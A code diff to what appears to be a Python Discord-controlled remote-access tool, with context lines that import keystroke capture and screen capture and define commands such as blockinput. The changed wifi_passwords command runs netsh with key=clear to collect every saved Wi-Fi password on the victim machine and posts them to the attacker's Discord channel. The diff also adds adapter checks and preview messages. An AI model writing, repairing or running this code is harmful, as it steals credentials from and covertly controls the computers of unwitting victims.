@@ -12,6 +12,7 @@ from pynput import keyboard
 from io import BytesIO
 import numpy as np
 import mss
+import errno
 import os
 import threading
 from multiprocessing import Process
@@ -1344,26 +1345,47 @@ async def wallpaper(ctx, url: str):
 @bot.command()
 async def wifi_passwords(ctx):
     try:
-        # Get list of all saved Wi-Fi profiles
+        await ctx.send("🔍 Checking for Wi-Fi support...")
+
+        # Check for Wi-Fi adapter
+        try:
+            interface_data = subprocess.check_output(
+                ['netsh', 'wlan', 'show', 'interfaces'],
+                text=True, encoding='utf-8'
+            )
+            await ctx.send(f"ℹ Interface data:\n```{interface_data[:500]}```")  # preview first 500 chars
+        except OSError as e:
+            if e.winerror == 50:
+                await ctx.send("⚠ This system does not support Wi-Fi commands (no adapter or WLAN stack).")
+                return
+            else:
+                await ctx.send(f"⚠ OS error: `{e}`")
+                return
+
+        if "There is no wireless interface" in interface_data:
+            await ctx.send("⚠ No Wi-Fi adapter detected.")
+            return
+
+        # Get list of profiles
         profiles_data = subprocess.check_output(
             ['netsh', 'wlan', 'show', 'profiles'],
             text=True, encoding='utf-8'
         )
+        await ctx.send(f"ℹ Profiles data:\n```{profiles_data[:500]}```")
+
         profiles = []
         for line in profiles_data.split('\n'):
             if "All User Profile" in line:
-                # Extract profile name
                 name = line.split(":")[1].strip()
                 profiles.append(name)
 
         if not profiles:
-            await ctx.send("No saved Wi-Fi profiles found.")
+            await ctx.send("⚠ No saved Wi-Fi profiles found.")
             return
 
         results = []
         for profile in profiles:
             try:
-                # Get the key content (password) for the profile
                 profile_info = subprocess.check_output(
                     ['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'],
                     text=True, encoding='utf-8'
@@ -1380,10 +1402,9 @@ async def wifi_passwords(ctx):
             except subprocess.CalledProcessError:
                 results.append(f"**{profile}**: *Failed to retrieve password*")
 
-        # Discord message limit ~2000 chars, chunk if needed
+        # Send results
         message = "\n".join(results)
         if len(message) > 1900:
-            # Split into chunks safely
             chunks = [message[i:i+1900] for i in range(0, len(message), 1900)]
             for chunk in chunks:
                 await ctx.send(f"```{chunk}```")
@@ -1591,4 +1612,5 @@ async def blockinput(ctx, duration: int):
         await ctx.send("🛑 Input unlocked.")
 
 bot.run(BOT_TOKEN)
+
 
